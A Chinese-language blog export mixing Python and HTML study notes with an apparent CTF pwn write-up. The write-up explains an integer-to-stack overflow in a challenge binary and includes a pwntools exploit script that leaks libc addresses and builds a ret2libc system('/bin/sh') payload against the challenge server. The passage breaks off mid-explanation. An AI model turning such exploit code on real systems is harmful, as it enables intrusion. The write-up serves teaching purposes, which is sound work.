class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n * fact(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure><ul><li>文档测试可以用来做实例，还可以测试数据的正确性，不过不要跟我一样写有规律的测试，写一些随机取数测试</li></ul><h2 id="os输入输出流部分"><a href="#os输入输出流部分" class="headerlink" title="os输入输出流部分"></a>os输入输出流部分</h2><p>感觉跟c的读写文件都差不多，附上练习部分解答</p><ol><li>利用 os 模块编写一个能实现 dir -l 输出的程序**</li></ol><ul><li>dir -1就是将每个文件包括目录按每行一个列出来，不包括隐藏文件<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dir1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(<span class="string">'.'</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> f.startswith(<span class="string">'.'</span>):</span><br><span class="line">            <span class="keyword">print</span> f</span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>编写一个程序，能在当前目录以及当前目录的所有子目录下查找文件名包含指定字符串的文件，并打印出相对路径。</li></ol><ul><li>这题也不难，说实话一开头还不会写，找了点参考文章后才会写</li></ul><p><strong>参考文章内容：</strong></p><ul><li><p>os.walk(path)遍历path，返回一个对象，</p></li><li><p>他的每个部分都是一个三元组(‘目录x’，[目录x下的目录list]，目录x下面的文件)</p></li><li><p>eg:for root ,dirs,files in os.walk(path): #os.walk返回的是一个三元组:根目录,文件列表，文件名</p></li><li><p>举例：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = os.walk(<span class="string">'.'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line">输出：</span><br><span class="line">(<span class="string">'.'</span>, [<span class="string">'abc'</span>, <span class="string">'temp'</span>], [<span class="string">'path0704.py'</span>, <span class="string">'\xc2\xb7\xbe\xb6\xcf\xe0\xb9\xd8\xd1\xa7\xcf\xb0.txt'</span>])</span><br><span class="line">(<span class="string">'.\\abc'</span>, [], [<span class="string">'\xd0\xc2\xbd\xa8 BMP \xcd\xbc\xcf\xf1.bmp'</span>])</span><br><span class="line">(<span class="string">'.\\temp'</span>, [<span class="string">'temp1'</span>], [<span class="string">'temp.h'</span>])</span><br><span class="line">(<span class="string">'.\\temp\\temp1'</span>, [], [<span class="string">'abc.bmp'</span>])</span><br></pre></td></tr></table></figure></li><li><p><strong>下面贴上我的代码</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Findfile</span><span class="params">(name)</span>:</span></span><br><span class="line">    myos = os.walk(<span class="string">'.'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> myos:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> i[<span class="number">2</span>]:</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> == j.find(name):</span><br><span class="line">                <span class="keyword">print</span> i[<span class="number">0</span>] + j</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    Findfile(<span class="string">'1.py'</span>)</span><br></pre></td></tr></table></figure></li></ul><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/1c68fab/">https://noone-hub.github.io/posts/1c68fab/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第三天学习</title>
    <url>/posts/a6467bc7/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="装饰器"><a href="#装饰器" class="headerlink" title="装饰器"></a>装饰器</h2><p>装饰器原来感觉不好理解，这不就是函数嘛，为啥叫装饰器，在知乎上看到的解释还蛮不错的，就是原来有个东西，只有基础的部件，通过添加一些新东西过后，他就变成一个高级的部件</p><p><strong>题目练习：请编写一个 decorator，能在函数调用的前后打印出’begin call’和’end call’的日志</strong></p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">    @functools.wraps(func)</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call start"</span></span><br><span class="line">        func(*args,**kw)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"call end"</span></span><br><span class="line">    <span class="keyword">return</span> wrapper</span><br></pre></td></tr></table></figure><p><strong>思考题：再思考一下能否写出一个@log的decorator，使它既支持：</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">又支持：</span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p>经过测试，是不可以的，先贴上我的代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">log</span><span class="params">(text = <span class="string">'execute'</span>)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">decorator</span><span class="params">(func)</span>:</span></span><br><span class="line"><span class="meta">        @functools.wraps(func)</span></span><br><span class="line">        <span class="function"><span class="keyword">def</span> <span class="title">wrapper</span><span class="params">(*args,**kw)</span>:</span></span><br><span class="line">            func(*args,**kw)</span><br><span class="line">        <span class="keyword">return</span> wrapper</span><br><span class="line">    <span class="keyword">return</span> decorator</span><br><span class="line"></span><br><span class="line"><span class="meta">@log('execute')</span></span><br><span class="line"><span class="comment">#@log</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">now</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"a+b is :&#123;&#125;,&#123;&#125;"</span>.format(a+b,a-b)</span><br><span class="line"></span><br><span class="line">now(<span class="number">1</span>,<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p><strong><big>理由如下：</big></strong></p><p>我以为利用默认参数可以，可报错出现了，显示的是<strong>decorator take exactly 1 arguements(2 given)</strong> 仔细分析一下可以知道@log(‘execute’)是执行完最外层的return了，到了decorator这层，这次就是now = decorator(now),而如果我用@log的话，就是now = log(now),这样明显会出错，无法将函数传到第二层的装饰器部分，即使有默认参数，他也只将now当作你传入的参数，也就是text进行执行，然后这样执行下来的结果就变成decorator(1,2)错误的做法</p><p><strong>练习题：请利用@property 给一个 Screen 对象加上width和height属性，以及一个只读属性 resolution</strong></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line">----</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">----</span><br><span class="line"><span class="comment"># test:</span></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line">print(s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = %d ?'</span> % s.resolution</span><br></pre></td></tr></table></figure><ul><li>类这大部分跟c的差别不大，唯一的区别就是可以动态绑定属性和函数</li><li>这道题不难，很简单，就是方法的使用，无技巧性的东西</li><li>贴上我的代码</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Screen</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._width</span><br><span class="line"><span class="meta">    @width.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">width</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._birth = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._height</span><br><span class="line"><span class="meta">    @height.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">height</span><span class="params">(self,value)</span>:</span></span><br><span class="line">        self._height = value</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">resolution</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._birth * self._height</span><br><span class="line"></span><br><span class="line">s = Screen()</span><br><span class="line">s.width = <span class="number">1024</span></span><br><span class="line">s.height = <span class="number">768</span></span><br><span class="line"><span class="keyword">print</span> (s.resolution)</span><br><span class="line"><span class="keyword">assert</span> s.resolution == <span class="number">786432</span>, <span class="string">'1024 * 768 = &#123;&#125;'</span>.format(s.resolution)</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/a6467bc7/">https://noone-hub.github.io/posts/a6467bc7/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第二天学习</title>
    <url>/posts/18030942/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><h2 id="回数的练习"><a href="#回数的练习" class="headerlink" title="回数的练习"></a>回数的练习</h2><p>我觉得吧，回数的判断方法用切片解决好，即是利用中点，然后判断两个序列是否相同，相同即为回数，这是最开头的想法，然后发觉切片实现这个有点麻烦，无意在网上查到了，直接从头和尾巴开始判断，这是最简单粗暴的办法，不过效率不高</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_palindrome</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> str(n) == str(n)[::<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="排序的练习"><a href="#排序的练习" class="headerlink" title="排序的练习"></a>排序的练习</h2><p>so easy,没什么好说的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">L =[(<span class="string">'Bob'</span>, <span class="number">75</span>), (<span class="string">'Adam'</span>, <span class="number">92</span>), (<span class="string">'Bart'</span>, <span class="number">66</span>), (<span class="string">'Lisa'</span>, <span class="number">88</span>)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">by_name</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">0</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">by_score</span><span class="params">(t)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> t[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">L1 = sorted(L,key=by_name)</span><br><span class="line"><span class="keyword">print</span> L1</span><br><span class="line">L2 = sorted(L,key=by_score)</span><br><span class="line"><span class="keyword">print</span> L2</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/18030942/">https://noone-hub.github.io/posts/18030942/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>python-第一天学习</title>
    <url>/posts/5a53500d/</url>
    <content><![CDATA[<h1 id="python3基础学习"><a href="#python3基础学习" class="headerlink" title="python3基础学习"></a>python3基础学习</h1><p>本文只记录对于我感兴趣的部分，为了好复习，只写关键点</p><h2 id="杨辉三角"><a href="#杨辉三角" class="headerlink" title="杨辉三角"></a>杨辉三角</h2><p>我想的是用循环，迭代的那种方法以及用列表生成式的写法我没想到</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triangle</span><span class="params">()</span>:</span></span><br><span class="line">    List = [<span class="number">1</span>] <span class="comment">#初始化第一行</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">yield</span>    <span class="comment">#迭代，返回然后从下一行开始</span></span><br><span class="line">        List = List[<span class="number">1</span>] + [List[i] + List[i+<span class="number">1</span>] <span class="keyword">for</span> i <span class="keyword">in</span> range(len(List) - <span class="number">1</span> )] + List[<span class="number">1</span>]</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><h2 id="名字规范化"><a href="#名字规范化" class="headerlink" title="名字规范化"></a>名字规范化</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> name[:<span class="number">1</span>].upper() + name[<span class="number">1</span>:].lower() <span class="comment">#利用切片巧妙分割</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">normalize</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> capitalize() <span class="comment">#ֱ直接利用python现成函数</span></span><br></pre></td></tr></table></figure><h2 id="str2float"><a href="#str2float" class="headerlink" title="str2float"></a>str2float</h2><p>这个说实话不用map跟reduce更好写，用了反而不会写了，我想到了将数据分为两部分，没想到最后那个除法写法</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,y)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x*<span class="number">10</span> + y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">str2float</span><span class="params">(s)</span>:</span></span><br><span class="line">    place = s.index(<span class="string">'.'</span>)</span><br><span class="line">    str1 = list(map(int,s[:place]))</span><br><span class="line">    str2 = list(map(int,s[place+<span class="number">1</span>:]))</span><br><span class="line">    <span class="keyword">return</span> reduce(f,str1) + reduce(f,str2)/pow(<span class="number">10</span>,len(str2))</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20190125204723398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3UwMTAzMzQ2NjY=,size_16,color_FFFFFF,t_70" alt="intersting"></p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/5a53500d/">https://noone-hub.github.io/posts/5a53500d/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>web前端学习之js</title>
    <url>/posts/3c1f8186/</url>
    <content><![CDATA[<h1 id="js学习"><a href="#js学习" class="headerlink" title="js学习"></a>js学习</h1><p>inerHtml跟inerText是不一样的，一个包含标签，一个不包含<br>字符串比较不要用===<br>inerText == 字符串可以<br>其余不行</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/3c1f8186/">https://noone-hub.github.io/posts/3c1f8186/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web,前端</tag>
      </tags>
  </entry>
  <entry>
    <title>jinja2问题记录</title>
    <url>/posts/ac0d3f82/</url>
    <content><![CDATA[<h1 id="问题记录"><a href="#问题记录" class="headerlink" title="问题记录"></a>问题记录</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for 循环是一层&#123;&#125;</span><br><span class="line">比如&#123;% for index in group %&#125;</span><br><span class="line">而不是&#123;&#123;% for index in group %&#125;&#125;</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/ac0d3f82/">https://noone-hub.github.io/posts/ac0d3f82/</a><br><strong>版权声明</strong>：转载请注明出处！</p>]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web， 前端</tag>
      </tags>
  </entry>
  <entry>
    <title>前端学习1</title>
    <url>/posts/5a4d96bd/</url>
    <content><![CDATA[<h1 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h1><html><head><meta charset="utf-8"><title>W3Cschool教程(w3cschool.cn)</title></head><body><p><b>这个文本加粗的</b></p><p><strong>这个文本是加粗的</strong></p><p><big>这个文本字体放大</big></p><p><em>这个文本是斜体的</em></p><p><i>这个文本是斜体的</i></p><p><small>这个文本是缩小的</small></p><p>这个文本包含<sub>下标</sub></p><p>这个文本包含<sup>上标</sup></p></body></html><h1 id="pre标签"><a href="#pre标签" class="headerlink" title="pre标签"></a>pre标签</h1><pre>
    此例演示如何使用 pre 标签
    对空行和   空格
    进行控制
</pre><h1 id="html全称"><a href="#html全称" class="headerlink" title="html全称"></a>html全称</h1><p><a>:anchor 定义锚<br><abbr>:abbreviation 定义缩写<br><acronym>: 定义只取消首字母的缩写</acronym></abbr></a></p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><!DOCTYPE html><address>:定义地址元素<area>:定义图像映射内部的区域 <b>:bold 定义粗体字<base>:定义页面当中的所有链接的基准链接 <bdo>: bidirectional override 定义文字的显示方向 <big>:定义大号字<blockquote>:定义长的引用<body>:定义body元素<br>:break 插入一个回车 <button>:定义按钮<caption>:定义表格标题 <cite>:citation 定义引用 <code>:computer code 定义计算机代码文本<col>:column 定义用于表格列的属性<colgroup>:column group 定义表格的列祖<dd>:definition description 定义定义的描述 <del>:delete 定义被删除的文本<div>:division 定义文档中的节 <dfn>:defining instance 定义定义的项目。<dl>:definition list 定义定义列表<dt>:definition term 定义定义的项目 <em>:emphasized 定义强调文本<fieldset>:定义域结构<form>:定义表单<frame>:定义框架的子窗口<frameset>:定义框架集<h1>to<h6>:定义标题1到标题6<head>:定义关于文档的信息<hr>:horizontal 定义水平线<html>:hypertext markup language 定义html文档 <i>:italic 定义斜体字<iframe>:inline frame 定义内联框架 <img>:image 定义图像 <input>: 定义输入域 <ins>:inserted 定义被插入的文本 <kbd>:keyboard 定义键盘文本<label>:定义针对表单控件的标签<legend>:定义框架集的标题<li>:list item 定义列表的项目<link>:定义资源引用<map>:定义图像映射<meta>:定义元信息<noframe>:定义无框架的节<noscript>:定义无脚本的节<object>:定义内嵌对象<ol>:ordered list 定义有序列表<optgroup>:option group 定义选项组<option>:定义下拉列表的选项<p>:paragraph 定义段落</p><param>:定义对象的参数<pre>:preformatted 定义预格式文本 
<q>:quotation 定义短的引用 
<samp>:sample 定义计算机代码样本 
<script>:定义脚本 
<select>:定义选择列表 
<small>:定义小字体文本 
<span>:定义文档中的节 
<strong>:stronger empasis定义强调文本 
<style>:定义样式的定义 
<sub>:subscript 定义下标文本 
<sup>:superscript 定义上标文本 
<table>:定义表格 
<tbody>:table body 定义表格的主体部分 
<td>:table data cell定义表格单元 
<textarea>:定义文本区域 
<tfoot>:table foot定义表也的脚注 
<th>:table header cell定义表格的表头单元格 
<thead>:table head定义表格的标题 
<title>:定义文档的标题 
<tr>:table row定义表格的行 
<tt>:teletype 定义打字机文本 
<ul>:unordered list 定义无序列表 
<var>:variable 定义变量 


<p>head 头信息<br>title 标题<br>body 正文<br>font 字体<br>br 换行<br>p 段落<br>pre 预格式化<br>hr 水平分界线<br>sup 上标<br>sub 下标<br>b 粗体<br>i 斜体<br>u 下划线<br>em 强调(斜体)<br>strong 强调(粗体)<br>tt 等宽字体(打印机字体)</p>
<ol>
<li></li>
<li></li>
</ol>有序列表
<ul>
<li></li>
<li></li>
</ul>无序列表
<a href=#>超链接
<img src=#>图片链接
th 表头单元
td 表格单元
tr 表格行
table 表格
caption 表格标题
form 交互式表单
input 输入表单控件
option 菜单类控件可选项 select中使用
select 菜单类控件
textarea 多行文本域
style 样式表

<h1 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h1><p><code>计算机输出</code><br><kbd>键盘输入</kbd><br><tt>打字机文本</tt><br><samp>计算机代码样本</samp><br><var>计算机变量</var></p>
<p><strong>本文作者</strong>：NoOne<br /><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/5a4d96bd/">https://noone-hub.github.io/posts/5a4d96bd/</a> <br /><strong>版权声明</strong>：转载请注明出处！</p>
</script></samp></q></pre><p></p></option></optgroup></ol></object></noscript></noframe></map></li></legend></label></kbd></ins></iframe></i></html></head></h6></h1></frameset></form></fieldset></em></dt></dl></dfn></div></del></dd></colgroup></code></cite></caption></button></body></blockquote></big></bdo></b></address><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
      <tags>
        <tag>web,前端,html</tag>
      </tags>
  </entry>
  <entry>
    <title>滴滴CTF之唯一的pwn题详解</title>
    <url>/posts/afd9f177/</url>
    <content><![CDATA[<h1 id="滴滴CTF之唯一的pwn题详解"><a href="#滴滴CTF之唯一的pwn题详解" class="headerlink" title="滴滴CTF之唯一的pwn题详解"></a>滴滴CTF之唯一的pwn题详解</h1><p>前言：这道题比赛期间没怎么研究，第一次搞了一天没搞出，不知道什么错，然后放弃了，然后比完后，搜了一波exp后，自己具体调试了一波，懂了整个过程，有些师傅们的wp有些小瑕疵，还有就是师傅们从来不详细写简单题的writeup，导致新手很难懂exp。好了，开始正文:</p><h2 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [esp+40h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">int</span> *v5; <span class="comment">// [esp+44h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = &amp;a1;</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  sub_80485DB(<span class="built_in">stdin</span>, <span class="built_in">stdout</span>);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Please set the length of password: "</span>);</span><br><span class="line">  nbytes = sub_804862D();</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)nbytes &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Too long!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter password(lenth %u): "</span>, nbytes);</span><br><span class="line">  v1 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v1, &amp;buf, nbytes);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"All done, bye!"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>sub_80485DB(stdin, stdout)内部代码</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_80485DB</span><span class="params">(FILE *stream, FILE *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-48h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter username: "</span>);</span><br><span class="line">  v2 = fileno(stream);</span><br><span class="line">  read(v2, &amp;buf, <span class="number">0x40</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fprintf</span>(a2, <span class="string">"Hello %s"</span>, &amp;buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_804862D()内部代码</strong></p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804862D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v0 = fileno(<span class="built_in">stdin</span>);</span><br><span class="line">  read(v0, nptr, <span class="number">0x10</span>u);</span><br><span class="line">  <span class="keyword">return</span> atoi(nptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从sub_804862D()这里明显可以看出整数溢出的洞，输入-1即可，-1在32位机器上为0xffffffff,具体可以自行调试查看，转化为signed int为-1，小于63，接下来在read(v1, &amp;buf, nbytes);就可以输入很长的一串字符，看上去好像很简单对吧，整数溢出，然后接着栈溢出，ROP一波梭。。。我觉得是这样的，可是运行自己的exp起来后，发觉有很大的问题，每次都是出错<br><img src="https://ww1.sinaimg.cn/large/005BYqpggy1g27zjxto4tj30m90g5adg.jpg" alt="1"><br>具体调试，你可以从</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">local = <span class="literal">False</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"><span class="keyword">if</span> local :</span><br><span class="line">    libc = elf.libc</span><br><span class="line">    io = process(<span class="string">'./xpwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'libc.so.6'</span>)</span><br><span class="line">    io = remote(<span class="string">"116.85.48.105"</span>, <span class="number">5005</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">IntOverFlow</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">UserName</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendafter(<span class="string">'Enter username: '</span>, payload)</span><br><span class="line">    io.recvuntil(payload)</span><br><span class="line">    __ebp__ = u32(io.recv(<span class="number">4</span>)) </span><br><span class="line">    setbuf = u32(io.recv(<span class="number">4</span>)) - <span class="number">21</span></span><br><span class="line">    log.success(<span class="string">"ebp: "</span> +  hex(__ebp__))</span><br><span class="line">    log.success(<span class="string">"setbuf: "</span> + hex(setbuf))</span><br><span class="line">    <span class="keyword">return</span> __ebp__, setbuf</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Passwd</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">'Enter password'</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    addr = UserName(<span class="string">'a'</span>*<span class="number">0x28</span>)</span><br><span class="line">    ebp = addr[<span class="number">0</span>]</span><br><span class="line">    ecx = ebp + <span class="number">24</span></span><br><span class="line">    setbuf = addr[<span class="number">1</span>]</span><br><span class="line">    IntOverFlow(<span class="number">-1</span>)</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    libc_base = setbuf - libc.symbols[<span class="string">'setbuf'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">    <span class="comment">#payload = 'a'*0x44 + p32(ecx) + p32(0)*6 + p32(system_addr) + p32(0) + p32(bin_sh)</span></span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    Passwd(<span class="string">'a'</span>*<span class="number">0x60</span>)</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h2><ul><li>在具体地方附加，用gdb.attach(io)附加，然后finish 